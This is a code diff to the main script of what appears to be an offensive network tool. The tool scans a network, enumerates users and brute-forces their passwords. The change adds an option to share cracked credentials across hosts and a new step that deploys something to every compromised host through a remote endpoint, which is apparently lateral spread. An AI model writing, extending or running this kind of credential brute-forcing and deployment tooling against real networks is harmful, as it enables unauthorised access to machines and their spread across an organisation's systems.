@@ -8,6 +8,7 @@ from polarity.bruteforce import BruteforceFactory
 from polarity.enumeration import UserEnumerator
 from polarity.network_scanner import PortScan
 from polarity.objects import User
+from polarity.host_deployment import HostDeployment
 
 
 def main():
@@ -23,6 +24,10 @@ def main():
                         help="File containing a password list")
     parser.add_argument("--password", "-p", required=False,
                         help="Single password to use during attacks")
+    parser.add_argument("--remote", "-r", required=False,
+                        default="http://localhost:5000", help="Remote endpoint")
+    parser.add_argument("--shared", "-s", action="store_true",
+                        help="Users and passwords discovered will be shared across hosts")
 
     if len(sys.argv) == 1:
         parser.print_help()
@@ -73,26 +78,38 @@ def main():
 
     hosts = PortScan.start_scan(args.network)
 
+    shared_users = []
+
     if not single_user:
         for host in hosts:
             enumerator = UserEnumerator(host)
             users = enumerator.enumerate()
             if users:
-                host.users = users
+                if not args.shared:
+                    host.users = users
                 for user in users:
                     user_set.add(user.username)
 
-            bruteforcers = (BruteforceFactory
-                            .get_bruteforcers_for_host(host, list(user_set),
-                                                       list(password_set)))
-            for bruteforcer in bruteforcers:
-                results = bruteforcer.start_bruteforce()
-                if results:
-                    for username in results.keys():
-                        user = host.get_user_by_username(username)
-                        if user:
-                            user.password = results[username]
+                bruteforcers = (BruteforceFactory
+                                .get_bruteforcers_for_host(host, list(user_set),
+                                                           list(password_set)))
+                for bruteforcer in bruteforcers:
+                    results = bruteforcer.start_bruteforce()
+                    if results:
+                        for username in results.keys():
+                            if args.shared:
+                                shared_users.append(User(username,
+                                                         results[username]))
+                            else:
+                                user = host.get_user_by_username(username)
+                                if user:
+                                    user.password = results[username]
+                        break
+
+                if len(shared_users) > 0:
                     break
+
+        HostDeployment.deploy(args.remote, hosts, shared_users)
 
     sys.exit(os.EX_OK)
 
